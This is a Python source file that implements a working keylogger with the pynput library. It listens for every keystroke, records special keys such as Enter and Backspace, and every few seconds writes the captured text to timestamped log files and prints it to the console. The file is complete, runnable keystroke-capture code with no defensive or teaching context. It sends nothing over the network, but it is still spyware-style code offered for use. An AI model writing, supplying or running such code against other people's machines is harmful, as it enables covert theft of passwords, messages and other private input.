from datetime import datetime
from threading import Timer
from pynput.keyboard import Listener, Key

class Keylogger:
    def __init__(self, interval : int = 60, reportMethod : str = "file"):
        self.interval = interval
        self.reportMethod = reportMethod
        self.log = ""                           # Contains the log of all the keystrokes within `self.interval`
        self.startDatetime = datetime.now()
        self.endDatetime = datetime.now()

    def callback(self, key : Key) -> None:
        """
            This callback is invoked whenever a keyboard event is occured
        """
        specialKeys = {
            Key.space: " ",
            Key.enter: "[ENTER]\n",
            Key.backspace: "[BACKSPACE]"
        }

        if key in specialKeys.keys():
            self.log += specialKeys[key]
        else:
            self.log += str(key).replace("'","")

    def report(self) -> None:
        """
            This function gets called every `self.interval`
            It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.endDatetime = datetime.now()
            self.updateFilename()

            if self.reportMethod == "file":
                self.reportToFile()
            print(f"[{self.fileName}] - {self.log}")
            self.startDatetime = datetime.now()
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def reportToFile(self) -> None:
        """
            This method creates a log file in the current directory that contains
            the current keylogs in the `self.log` variable
        """
        with open(f"{self.fileName}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.fileName}.txt")

    def start(self) -> None:
        self.startDatetime = datetime.now()
        # Start the keylogger
        # Start reporting the keylogs
        self.report()
        # Make a simple message
        print(f"{datetime.now()} - Started keylogger")
        with Listener(on_release=self.callback) as listener:
            listener.join()

    def updateFilename(self) -> None:
        """
            Construct the filename to be identified by start & end datetimes
        """
        startDatetimeString = str(self.startDatetime)[:-7].replace(" ", "-").replace(":", "")
        endDatetimeString = str(self.endDatetime)[:-7].replace(" ", "-").replace(":", "")
        self.fileName = f"keylog-{startDatetimeString}_{endDatetimeString}"

if __name__ == "__main__":
    Keylogger(
        interval=5,
        reportMethod="file"
    ).start()